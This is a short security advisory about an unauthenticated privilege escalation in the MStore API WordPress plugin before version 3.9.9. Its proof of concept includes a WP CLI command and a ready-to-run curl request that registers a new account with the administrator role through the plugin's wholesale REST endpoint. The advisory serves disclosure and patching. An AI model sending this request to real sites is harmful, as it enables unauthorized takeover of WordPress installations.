## WordPress Plugin Vulnerabilities

# MStore API < 3.9.9 - Unauthenticated Privilege Escalation

### Description

The plugin does not prevent visitors from creating user accounts with the role of their choice via their wholesale REST API endpoint. This is only exploitable if the site owner paid to access the plugin's pro features.

### Proof of Concept

1) Simulate the site has a valid Pro API key by running the following in WP CLI:
wp> update\_option('mstore\_purchase\_code', true)
2) Send the following request:
curl --url 'http://vulnerable-site.tld/wp-json/api/flutter\_wholesale/register' -H 'Content-Type: application/json' --data '{"username":"new\_user","email":"new\_user\_email@email.com","role":"administrator","password":"user\_password"}'
